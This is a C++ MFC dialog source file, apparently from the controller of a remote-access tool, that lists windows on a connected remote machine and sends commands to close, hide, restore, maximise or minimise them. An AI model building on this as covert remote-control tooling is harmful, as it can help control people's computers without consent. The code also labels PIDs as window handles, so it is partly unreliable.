// CWindowDlg.cpp: 实现文件
//

#include "pch.h"
#include "UI.h"
#include "CWindowDlg.h"
#include "afxdialogex.h"
#include "Others/macros.h"


// CWindowDlg 对话框

IMPLEMENT_DYNAMIC(CWindowDlg, CDialogEx)

CWindowDlg::CWindowDlg(CWnd* pParent,
						CIOCPServer *pIOCPServer,
						ClientContext *pContext)
	: CDialogEx(IDD_DIALOG_WINDOW, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(),
						MAKEINTRESOURCE(IDI_SYSTEM));
}

CWindowDlg::~CWindowDlg()
{
}

void CWindowDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_WINDOW, m_listWindow);
}


BEGIN_MESSAGE_MAP(CWindowDlg, CDialogEx)
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_WINDOW, &CWindowDlg::OnNMRClickListWindow)
	ON_COMMAND(ID_WSLIST_REFRESH, &CWindowDlg::OnWslistRefresh)
	ON_COMMAND(ID_WSLIST_CLOSE, &CWindowDlg::OnWslistClose)
	ON_COMMAND(ID_WSLIST_HIDE, &CWindowDlg::OnWslistHide)
	ON_COMMAND(ID_WSLIST_RETURN, &CWindowDlg::OnWslistReturn)
	ON_COMMAND(ID_WSLIST_MAX, &CWindowDlg::OnWslistMax)
	ON_COMMAND(ID_WSLIST_MIN, &CWindowDlg::OnWslistMin)
END_MESSAGE_MAP()


// CWindowDlg 消息处理程序


BOOL CWindowDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);
	SetIcon(m_hIcon, FALSE);

	CString title;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,
		(SOCKADDR *)&sockAddr,
		&nSockAddrLen);
	title.Format("\\\\%s - 窗口列表",
		bResult != INVALID_SOCKET ?
		inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(title);

	m_listWindow.SetExtendedStyle(LVS_EX_FLATSB |LVS_EX_FULLROWSELECT);
	m_listWindow.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
	m_listWindow.InsertColumn(1, "窗口名称", LVCFMT_LEFT, 300);
	m_listWindow.InsertColumn(2, "窗口状态", LVCFMT_LEFT, 300);

	ShowWindowList();
	//ReSize();

	return TRUE;
}


void CWindowDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	ReSize();
}

void CWindowDlg::ReSize()
{
	if (m_listWindow.m_hWnd == NULL) {
		return;
	}

	RECT client;
	RECT fill;

	GetClientRect(&client);
	fill.left = 0;
	fill.top = 0;
	fill.right = client.right;
	fill.bottom = client.bottom;
	m_listWindow.MoveWindow(&fill);
}

void CWindowDlg::GetWindowList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CWindowDlg::OnReceiveComplete()
{
	ShowWindowList();
}

void CWindowDlg::ShowWindowList()
{
	LPBYTE Buf = m_pContext->m_DeCompressionBuffer.GetBuffer(1);

	UINT i = 0;
	DWORD dwOffset = 0;
	CString s;

	for (; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; ++i)
	{
		LPDWORD PID = LPDWORD(Buf + dwOffset);
		char *Title = (char *)Buf + dwOffset + sizeof(DWORD);
		s.Format("%5u", *PID);
		m_listWindow.InsertItem(i, s);
		m_listWindow.SetItemText(i, 1, Title);
		m_listWindow.SetItemText(i, 2, "显示");
		m_listWindow.SetItemData(i, *PID);

		dwOffset += sizeof(DWORD) + lstrlen(Title) + 1;
	}

	s.Format("窗口名称 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = s.GetBuffer(0);
	lvc.cchTextMax = s.GetLength();

	m_listWindow.SetColumn(1, &lvc);
}


void CWindowDlg::OnNMRClickListWindow(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	CMenu popup, *pSub = nullptr;
	CPoint p;

	popup.LoadMenu(IDR_WSLIST);
	GetCursorPos(&p);
	pSub = popup.GetSubMenu(0);
	pSub->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}


void CWindowDlg::OnWslistRefresh()
{
	GetWindowList();
}


// msg format: COMMAND_WINDOW_CLOSE + hWnd
void CWindowDlg::OnWslistClose()
{
	int selt = m_listWindow.GetSelectionMark();
	if (selt >= 0) {
		BYTE msg[20];
		ZeroMemory(msg, sizeof(msg));
		msg[0] = COMMAND_WINDOW_CLOSE;

		DWORD hWnd = m_listWindow.GetItemData(selt);
		memcpy(msg + 1, &hWnd, sizeof(DWORD));

		m_iocpServer->Send(m_pContext, msg, sizeof(msg));
	}
}

// msg format: COMMAND_WINDOW_CLOSE + hWnd + how
void CWindowDlg::OnWslistHide()
{
	int selt = m_listWindow.GetSelectionMark();
	if (selt >= 0) {
		BYTE msg[20];
		ZeroMemory(msg, sizeof(msg));
		msg[0] = COMMAND_WINDOW_TEST;

		DWORD hWnd = m_listWindow.GetItemData(selt);
		m_listWindow.SetItemText(selt, 2, "隐藏");
		memcpy(msg + 1, &hWnd, sizeof(DWORD));

		DWORD how = SW_HIDE;
		memcpy(msg + 1 + sizeof(DWORD), &how, sizeof(DWORD));

		m_iocpServer->Send(m_pContext, msg, sizeof(msg));
	}
}


void CWindowDlg::OnWslistReturn()
{
	int selt = m_listWindow.GetSelectionMark();
	if (selt >= 0) {
		BYTE msg[20];
		ZeroMemory(msg, sizeof(msg));
		msg[0] = COMMAND_WINDOW_TEST;

		DWORD hWnd = m_listWindow.GetItemData(selt);
		m_listWindow.SetItemText(selt, 2, "显示");
		memcpy(msg + 1, &hWnd, sizeof(DWORD));

		DWORD how = SW_RESTORE;
		memcpy(msg + 1 + sizeof(DWORD), &how, sizeof(DWORD));

		m_iocpServer->Send(m_pContext, msg, sizeof(msg));
	}
}


void CWindowDlg::OnWslistMax()
{
	int selt = m_listWindow.GetSelectionMark();
	if (selt >= 0) {
		BYTE msg[20];
		ZeroMemory(msg, sizeof(msg));
		msg[0] = COMMAND_WINDOW_TEST;

		DWORD hWnd = m_listWindow.GetItemData(selt);
		memcpy(msg + 1, &hWnd, sizeof(DWORD));

		DWORD how = SW_MAXIMIZE;
		memcpy(msg + 1 + sizeof(DWORD), &how, sizeof(DWORD));

		m_iocpServer->Send(m_pContext, msg, sizeof(msg));
	}
}


void CWindowDlg::OnWslistMin()
{
	int selt = m_listWindow.GetSelectionMark();
	if (selt >= 0) {
		BYTE msg[20];
		ZeroMemory(msg, sizeof(msg));
		msg[0] = COMMAND_WINDOW_TEST;

		DWORD hWnd = m_listWindow.GetItemData(selt);
		memcpy(msg + 1, &hWnd, sizeof(DWORD));

		DWORD how = SW_MINIMIZE;
		memcpy(msg + 1 + sizeof(DWORD), &how, sizeof(DWORD));

		m_iocpServer->Send(m_pContext, msg, sizeof(msg));
	}
}
